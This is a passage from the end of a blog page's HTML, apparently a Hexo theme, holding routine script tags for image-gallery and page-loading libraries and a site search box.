    });</script><script src="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/js/lightgallery.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
            if (typeof $.fn.lightGallery === 'function') {
                $('.article').lightGallery({ selector: '.gallery-item' });
            }
            if (typeof $.fn.justifiedGallery === 'function') {
                if ($('.justified-gallery > p > .gallery-item').length) {
                    $('.justified-gallery > p > .gallery-item').unwrap();
                }
                $('.justified-gallery').justifiedGallery();
            }
        });</script><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/pjax@0.2.8/pjax.min.js"></script><script src="/js/pjax.js"></script><!--!--><!--!--><!--!--><script data-pjax src="/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="Type something..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script src="/js/insight.js" defer></script><script>document.addEventListener('DOMContentLoaded', function () {
            loadInsight({"contentUrl":"/content.json"}, {"hint":"Type something...","untitled":"(Untitled)","posts":"Posts","pages":"Pages","categories":"Categories","tags":"Tags"});
        });</script></body></html>